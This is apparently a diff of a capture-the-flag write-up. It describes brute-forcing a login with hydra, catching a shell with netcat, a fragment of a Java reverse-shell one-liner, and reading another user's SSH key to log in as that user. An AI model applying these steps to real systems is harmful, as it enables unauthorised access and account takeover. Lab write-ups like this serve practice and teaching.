@@ -16,7 +16,7 @@ After some digging I decided to use hydra to bruteforce it
 
 ![](images/hydra_command.png)
 
-We got a hit!
+We got a hit :grin: !
 
 ![](images/hydra_success.png)
 
@@ -42,4 +42,20 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 Then started a netcat listener and ran the script
 
-![alt text](image.png)
+![alt text](images/shell.png)
+
+Found another Flag
+
+![alt text](images/flag70.png)
+
+Ran Linpeas but no dice, looked around and found another user `juniordev`, the user has a `.ssh` folder but i cannot `-ls -la` the folder due to permission issues
+
+![](images/junirdevlsla.png)
+
+But funny enough I can `cat` out it's presumed contents:
+
+![](images/cat.png)
+
+Copy paste and ssh into junior dev and voila we are juniordev
+
+
